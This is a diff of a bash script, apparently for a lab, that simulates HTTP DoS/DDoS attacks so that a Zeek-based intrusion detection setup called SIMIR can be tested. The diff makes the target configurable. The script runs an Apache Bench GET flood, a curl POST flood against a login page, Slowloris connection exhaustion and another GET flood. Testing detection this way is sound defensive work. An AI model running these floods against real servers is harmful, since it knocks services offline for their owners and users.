@@ -1,17 +1,24 @@
 #!/usr/bin/env bash
 
 echo "[+] Starting HTTP DoS/DDoS Attack Simulation"
-echo "[+] Target: http://192.168.56.51"
+
+# Usar variável de ambiente SERVER_IP, com fallback para valor padrão
+TARGET_IP="${SERVER_IP:-192.168.56.111}"
+echo "[+] Target: http://${TARGET_IP}"
 echo ""
 
+ip link set lo up
+ip link set veth-cont-02 name eth0
+ip link set eth0 up
+dhclient -v eth0
+
 # Extrai apenas o IP/hostname sem http://
-TARGET_HOST=$(echo '192.168.56.51' | sed 's/http:\/\///' | sed 's/https:\/\///' | cut -d'/' -f1)
+TARGET_HOST=$(echo "${TARGET_IP}" | sed 's/http:\/\///' | sed 's/https:\/\///' | cut -d'/' -f1)
 
 # Ataque 1: Apache Bench - High Volume HTTP GET Flood
 echo "[1/4] Apache Bench - High Volume HTTP GET Flood"
 echo "      Sending 10000 requests with 200 concurrent connections..."
-# Aumentado para garantir detecção (10k requests, 200 concurrent)
-ab -n 10000 -c 200 -t 60 -k -r "http://192.168.56.51/" > /dev/null 2>&1 &
+ab -n 10000 -c 200 -t 60 -k -r "http://${TARGET_HOST}/" > /dev/null 2>&1 &
 AB_PID=$!
 
 # Aguarda um pouco antes do próximo ataque
@@ -26,8 +33,8 @@ for i in $(seq 1 1000); do
          -H "Connection: keep-alive" \
          -d "user=attacker&pass=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)" \
          --connect-timeout 2 --max-time 5 \
-         "http://${TARGET_WEB}/login" > /dev/null 2>&1 &
-    
+         "http://${TARGET_HOST}/login" > /dev/null 2>&1 &
+
     # Controla taxa mas mantém alta intensidade
     if [ $((i % 100)) -eq 0 ]; then
         sleep 0.5
@@ -39,7 +46,7 @@ sleep 3
 # Ataque 3: Slowloris - Esgota conexões do servidor
 echo "[3/4] Slowloris - Connection Exhaustion Attack"
 echo "      Opening 200 slow connections to exhaust server resources..."
-timeout 30s slowloris '192.168.56.51' -s 200 -t 60 > /dev/null 2>&1 &
+timeout 30s slowloris "${TARGET_HOST}" -s 200 -t 60 > /dev/null 2>&1 &
 SLOW_PID=$!
 
 # Aguarda um pouco antes do próximo ataque
@@ -55,8 +62,8 @@ for i in $(seq 1 500); do
          -H "User-Agent: Mozilla/5.0 (DoS-Test)" \
          -H "Connection: keep-alive" \
          --connect-timeout 2 --max-time 5 \
-         "http://192.168.56.51/" > /dev/null 2>&1 &
-    
+         "http://${TARGET_HOST}/" > /dev/null 2>&1 &
+
     if [ $((i % 50)) -eq 0 ]; then
         sleep 0.3
     fi
@@ -74,6 +81,7 @@ sleep 10
 echo ""
 echo "[+] DoS/DDoS HTTP Attack Simulation Completed"
 echo "[+] Attack Summary:"
+echo "    - Target: http://${TARGET_HOST}"
 echo "    - Apache Bench: 10,000 requests (200 concurrent)"
 echo "    - POST Flood: 1,000 POST requests"
 echo "    - Slowloris: 200 slow connections (30s)"
@@ -83,4 +91,4 @@ echo "[+] Attack duration: ~90 seconds"
 echo ""
 echo "[+] Expected SIMIR Detection:"
 echo "    - DoS_Attack_Detected (>100 connections from single source)"
-echo "    - Check: docker exec SIMIR_Z grep 'DoS\\|DDoS' /usr/local/zeek/spool/zeek/notice.log"   
+echo "    - Check: docker exec SIMIR_Z grep 'DoS\\|DDoS' /usr/local/zeek/spool/zeek/notice.log"
